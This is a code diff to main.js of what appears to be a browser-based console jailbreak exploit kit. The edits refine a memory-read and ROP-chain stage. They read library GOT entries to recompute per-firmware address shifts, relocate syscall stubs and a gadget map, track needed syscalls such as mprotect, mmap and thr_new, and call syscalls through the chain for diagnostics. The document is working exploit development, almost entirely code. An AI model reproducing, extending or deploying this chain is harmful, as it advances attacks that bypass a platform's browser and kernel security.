@@ -409,7 +409,7 @@ async function prepare(p) {
        cache-buster, so a reload can serve a stale page that still references an
        old main.js -- twice now a run has been analysed as if it contained a
        change it did not. Stamp the build on screen so that is never in doubt. */
-    jbmark("BUILD", "main.js v=46 | if this is not the version just"
+    jbmark("BUILD", "main.js v=47 | if this is not the version just"
         + " pushed, the console is running a CACHED page and the run means"
         + " nothing -- force a reload");
 
@@ -471,13 +471,18 @@ async function prepare(p) {
         const hx = (d) => (d < 0 ? "-0x" : "+0x") + Math.abs(d).toString(16);
         /* One mark per step. The screen truncates at 110 characters and the
            first attempt lost exactly the tail that mattered. */
-        const report = (tag, g) => {
+        const report = (tag, g, lo, hi) => {
             jbmark(tag, g.length + " step(s) / "
-                + g.reduce((a, x) => a + x.n, 0) + " probes");
-            for (let i = 0; i < g.length && i < 12; i++)
+                + g.reduce((a, x) => a + x.n, 0) + " probes | "
+                + hx(g[0].d) + ".." + hx(g[g.length - 1].d));
+            let shown = 0;
+            for (let i = 0; i < g.length && shown < 8; i++) {
+                if (lo !== undefined && (g[i].hi < lo || g[i].lo > hi)) continue;
+                shown++;
                 jbmark(tag + "-" + (i + 1), hx(g[i].d) + " @0x"
                     + g[i].lo.toString(16) + "..0x" + g[i].hi.toString(16)
                     + " n=" + g[i].n);
+            }
         };
         /* The shift at `rva`, or null when the landmarks bracketing it
            disagree -- i.e. an insertion happened somewhere in between and
@@ -492,22 +497,65 @@ async function prepare(p) {
             }
             if (lo && hi) return lo[1] === hi[1] ? lo[1] : null;
             if (lo) return lo[1];       // past the last landmark
+            /* BELOW the first landmark is not unknown. The shift function
+               starts at 0 at rva 0 and never decreases, so if the first
+               landmark still reads 0 then nothing was inserted before it and
+               nothing below it can have moved. `ret` 0x42 lives down here, and
+               calling it unknown is what blocked the entire gadget map. */
+            if (hi && hi[1] === 0) return 0;
             return null;
         };
+        /* One landmark in 67 came back +0x7b5e700 -- a NID that resolves to a
+           different module than our file says, or a slot that is not what the
+           relocation claims. One such row splits an otherwise flat profile
+           into three steps and makes every address near it unresolvable, so
+           drop anything that is not plausibly a build-to-build displacement. */
+        const clean = (rows) => rows.filter(r => r[1] > -0x100000
+            && r[1] < 0x100000);
         const byRva = (a, b) => a[0] - b[0];
 
         try {
-            const lkRows = viaGot(OFFSET_lk_import_landmarks, lkN)
+            /* libc's GOT is a second, denser view of the same thing: it
+               imports 132 libkernel_web exports, 34 of them inside the syscall
+               stub block against WebKit's 21. Its bias is detected rather than
+               assumed -- a wrong one reads the neighbouring slot and the rows
+               stop looking like displacements at all. */
+            let lcBias = 0, lcBest = -1;
+            if (typeof OFFSET_lk_landmarks_via_lc !== "undefined") {
+                const probe = OFFSET_lk_landmarks_via_lc.filter((e, i) => i % 9 === 0);
+                for (const b of [0, 0x4000, -0x4000]) {
+                    const ok = probe.filter((e) => {
+                        const d = numOf(p.read8(libSceLibcInternalBase
+                            .add32(e[1] + b))) - lkN - e[0];
+                        return d > -0x10000 && d < 0x10000;
+                    }).length;
+                    if (ok > lcBest) { lcBest = ok; lcBias = b; }
+                }
+                jbmark("SHIFT-LK-VIALC", "bias=" + hx(lcBias) + " plausible="
+                    + lcBest + "/" + probe.length);
+            }
+            const viaLc = (typeof OFFSET_lk_landmarks_via_lc !== "undefined"
+                && lcBest > 0)
+                ? OFFSET_lk_landmarks_via_lc.map((e) => [e[0],
+                    numOf(p.read8(libSceLibcInternalBase.add32(e[1] + lcBias)))
+                    - lkN - e[0]])
+                : [];
+            const lkRows = clean(viaGot(OFFSET_lk_import_landmarks, lkN)
                 .concat(viaOwn(libKernelBase, lkN, OFFSET_lk_shift_probe))
+                .concat(viaLc))
                 .sort(byRva);
-            report("SHIFT-LK", steps(lkRows));
-            const lcRows = viaGot(OFFSET_lc_import_landmarks, lcN).sort(byRva);
+            /* Only the steps over the syscall stub block are worth screen
+               space; libkernel_web is a 15-step staircase and printing all of
+               it pushes the actual run off the top. */
+            report("SHIFT-LK", steps(lkRows), 0x33000, 0x39000);
+            const lcRows = clean(viaGot(OFFSET_lc_import_landmarks, lcN))
+                .sort(byRva);
             report("SHIFT-LC", steps(lcRows));
-            const wkRows = viaOwn(libSceNKWebKitBase, wkN,
+            const wkRows = clean(viaOwn(libSceNKWebKitBase, wkN,
                 OFFSET_wk_shift_probe.concat(
                     typeof OFFSET_wk_shift_probe_gap !== "undefined"
                         ? OFFSET_wk_shift_probe_gap : [])
-                    .map(e => [e[0], e[1] + GOT])).sort(byRva);
+                    .map(e => [e[0], e[1] + GOT]))).sort(byRva);
             report("SHIFT-WK", steps(wkRows));
 
             /* Read, not derived: these 21 stubs are imported by name, so their
@@ -528,15 +576,29 @@ async function prepare(p) {
                 + ((syscall_map[0x14] || 0)).toString(16));
 
             /* Everything else moves by the step it sits in, or not at all. */
-            let sFix = 0, sUnk = 0;
+            let sFix = 0;
+            const gone = [];
             for (const k in syscall_map) {
                 if (exact[k]) continue;
                 const d = at(lkRows, syscall_map[k]);
-                if (d === null) { sUnk++; continue; }
+                if (d === null) { gone.push(k); continue; }
                 syscall_map[k] += d; if (d) sFix++;
             }
-            jbmark("SYSCALL-SHIFTED", sFix + " moved, " + sUnk
-                + " left alone (inside a step), " + nExact + " exact");
+            /* A stub whose step is unknown is not "probably fine": the block is
+               a 0x20 grid, so a wrong lookup runs a DIFFERENT syscall with
+               whatever happens to be in the argument registers. getpid coming
+               back as -1 was the harmless version of that; exit, munmap or
+               thr_kill would not be. Drop them so a caller fails loudly. */
+            for (const k of gone) delete syscall_map[k];
+            SHIFT.exact = exact;
+            SHIFT.dropped = gone.length;
+            const need = { 0x3: "read", 0x4: "write", 0x6: "close",
+                0x4a: "mprotect", 0x61: "socket", 0x1c7: "thr_new",
+                0x1dd: "mmap", 0x14b: "sched_yield" };
+            jbmark("SYSCALL-SHIFTED", sFix + " moved, " + nExact + " exact, "
+                + gone.length + " dropped as unresolved");
+            jbmark("SYSCALL-NEED", Object.keys(need).map(n =>
+                need[n] + (syscall_map[n] ? "" : "=GONE")).join(" "));
 
             /* Refuse to half-apply the gadget map. If any gadget the chain
                itself runs falls inside a step, moving the others desyncs the
@@ -1613,10 +1675,17 @@ async function prepare(p) {
                one wrong means only that stub is. */
             for (const [nm, nr, ck] of [
                 ["syscall:getpid", 0x14, (v) => v.hi === 0 && v.low > 0 && v.low < 0x100000],
+                ["syscall:sched_yield", 0x14b, (v) => v.hi === 0 && v.low === 0],
                 ["syscall:getuid", 0x18, (v) => v.hi === 0 && v.low < 0x100000],
                 ["syscall:getgid", 0x2f, (v) => v.hi === 0 && v.low < 0x100000],
                 ["syscall:getppid", 0x1b, (v) => v.hi === 0 && v.low < 0x100000]]) {
                 if (!(nr in syscall_map)) continue;
+                /* Only stubs whose console address was READ out of the GOT.
+                   On 7.00.00.70 the stub block gained entries, so an address
+                   this suite merely interpolated may be a different syscall
+                   entirely -- and calling one of those with junk arguments is
+                   how a diagnostic turns into a crash. */
+                if (SHIFT && SHIFT.exact && !SHIFT.exact[nr]) continue;
                 await runTest(nm, () => { chain.fcall(syscalls[nr]); }, ck);
             }
 
@@ -1727,4 +1796,4 @@ let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 
 window.__offsetsScript = fwScript;
-fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=46`);
+fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=47`);
